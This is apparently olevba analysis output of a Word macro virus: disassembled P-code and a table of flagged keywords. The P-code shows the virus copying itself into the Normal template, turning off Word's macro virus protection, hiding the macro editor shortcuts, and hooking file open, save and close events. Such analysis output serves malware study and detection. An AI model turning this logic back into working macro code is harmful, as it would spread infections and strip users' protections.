' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "Virus"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #202:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #203:
' 	EndIfBlock 
' Line #204:
' Line #205:
' 	EndSub 
' Line #206:
' 	FuncDefn (Sub Initialize())
' Line #207:
' 	OnError (Resume Next) 
' Line #208:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #209:
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #210:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #211:
' 	LitStr 0x0018 "Emmanuel D. delos Santos"
' 	MemStWith UserName 
' Line #212:
' 	LitStr 0x0004 "Home"
' 	MemStWith UserAddress 
' Line #213:
' 	LitStr 0x0003 "EDS"
' 	MemStWith UserInitials 
' Line #214:
' 	EndWith 
' Line #215:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #216:
' 	LitStr 0x0019 "Emmannuel D. delos Santos"
' 	MemStWith Author 
' Line #217:
' 	LitStr 0x0005 "Virus"
' 	MemStWith Title 
' Line #218:
' 	LitStr 0x0004 "Kill"
' 	MemStWith Subject 
' Line #219:
' 	ArgsMemCallWith Execute 0x0000 
' Line #220:
' 	EndWith 
' Line #221:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #222:
' 	LitVarSpecial (True)
' 	MemStWith ConfirmConversions 
' Line #223:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #224:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #225:
' 	EndWith 
' Line #226:
' 	Ld wdKeyF11 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Clear 0x0000 
' Line #227:
' 	Ld wdKeyF8 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Clear 0x0000 
' Line #228:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #229:
' 	EndSub 
' Line #230:
' 	FuncDefn (Sub FileExit())
' Line #231:
' 	OnError (Resume Next) 
' Line #232:
' 	ArgsCall (Call) Initialize 0x0000 
' Line #233:
' 	ArgsCall (Call) Immunize 0x0000 
' Line #234:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #235:
' 	EndSub 
' Line #236:
' 	FuncDefn (Sub FileNew())
' Line #237:
' 	OnError (Resume Next) 
' Line #238:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #239:
' 	ArgsCall (Call) Destroy 0x0000 
' Line #240:
' 	EndSub 
' Line #241:
' 	FuncDefn (Sub FileClose())
' Line #242:
' 	OnError (Resume Next) 
' Line #243:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #244:
' 	ArgsCall (Call) Destroy 0x0000 
' Line #245:
' 	EndSub 
' Line #246:
' 	FuncDefn (Sub AutoOpen())
' Line #247:
' 	OnError (Resume Next) 
' Line #248:
' 	ArgsCall (Call) Initialize 0x0000 
' Line #249:
' 	ArgsCall (Call) Immunize 0x0000 
' Line #250:
' 	EndSub 
' Line #251:
' 	FuncDefn (Sub AutoExec())
' Line #252:
' 	OnError (Resume Next) 
' Line #253:
' 	ArgsCall (Call) Initialize 0x0000 
' Line #254:
' 	ArgsCall (Call) Immunize 0x0000 
' Line #255:
' 	EndSub 
' Line #256:
' 	FuncDefn (Sub FileSaveAs())
' Line #257:
' 	OnError (Resume Next) 
' Line #258:
' 	ArgsCall (Call) Initialize 0x0000 
' Line #259:
' 	ArgsCall (Call) Immunize 0x0000 
' Line #260:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #261:
' 	ArgsCall (Call) Immunize 0x0000 
' Line #262:
' 	EndSub 
' Line #263:
' 	FuncDefn (Sub FileOpen())
' Line #264:
' 	OnError (Resume Next) 
' Line #265:
' 	ArgsCall (Call) Initialize 0x0000 
' Line #266:
' 	ArgsCall (Call) Immunize 0x0000 
' Line #267:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #268:
' 	ArgsCall (Call) Immunize 0x0000 
' Line #269:
' 	EndSub 
' Line #270:
' Line #271:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |lz32.dll            |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
|Base64    |*)e                 |Kill                                         |
|String    |                    |                                             |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

